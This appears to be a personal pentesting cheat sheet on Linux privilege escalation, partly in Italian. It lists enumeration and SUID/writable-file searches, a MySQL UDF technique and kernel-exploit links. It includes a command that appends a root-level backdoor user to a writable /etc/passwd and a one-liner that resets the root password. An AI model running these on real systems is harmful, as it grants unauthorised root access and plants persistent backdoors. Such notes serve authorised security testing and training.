## What to look for
- History File
- Credentials Access
	- Reused Passwords
	- Config FIles
	- Local Database
	- Keys SSH
	- Bash History
- Miss-configured services (cronjobs)
	- Writable Cronjob
	- Writable Cronjob dipendency/script
- any process running as a privileged user?
	- MySQL as root?
- Incorrect permissions 
	- sudo -l
	- Docker, LXC?
	- senstive files readable/writable (passwd, shadow)
- misconfigured environment ($PATH)
- Binary with SUID/SGID bit
- Software or OS with known vulnerabilities
- [[File Capabilities]]


### Enumeration
Architecture
```cat /etc/issue && uname -a && arch```

Processes (look for root)
```ps -auxw```

Network info
```
ifconfig -a
ip addr
route
```

Firewall Status
```
#(server root)
iptables --list
```
Cronjobs
```
ls -lah /etc/cron*
cat /etc/crontab
grep "CRON" /var/log/cron.log
```

Log files:
See [[Linux Hardening & Logging]]

### Bad Permission
Writable files
```
find / -writable -type f 2> /dev/null | grep -v proc
find / -user admin -type f 2>/dev/null
find / -user catherine -type f 2>/dev/null                        
find / -writable -group root 2>/dev/null
```

If findutils is missing (maybe it's really old)
```find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null```

writable /etc/passwd

```bash
openssl passwd evil

echo 'rutto:1DrTbIWRDbpz.:0:0:root:/root:/bin/bash' >> /etc/passwd

su rutto #pass: evil
```

change user password non-interactivly
```bash
echo "root:topkek!" | sudo chpasswd
```

### SUID & SGID
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID

```

Altri esempi

```bash
find / -perm -1000 -type d 2>/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.

find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.

find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID
```

### UDF (MySQL Running as root)
Prerequisites
-   mysqld must run as root (ps aux | grep mysqld)
-   you must know the credentials of a MySQL user that has the permission to create stored function on the DBMS-

La famosa do_system('cmd') di mysql (trovata soprattutto in hacktricks) non esiste nativamente ma inserendo un oggetto UDF compilato creato da noi possiamo includerlo e utilizzarlo!!!

POC + Script:
- [https://github.com/zinzloun/MySQL-UDF-PrivEsc](https://github.com/zinzloun/MySQL-UDF-PrivEsc)
- [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

### Kernel Exploits
https://github.com/lucyoa/kernel-exploits

per compilare:
```gcc exploit.c -o exploit```

[[Compiler Flags (GCC)]]

## Other Techniques
[[DOSBox Privilege Escalation]]

## Auto Tools
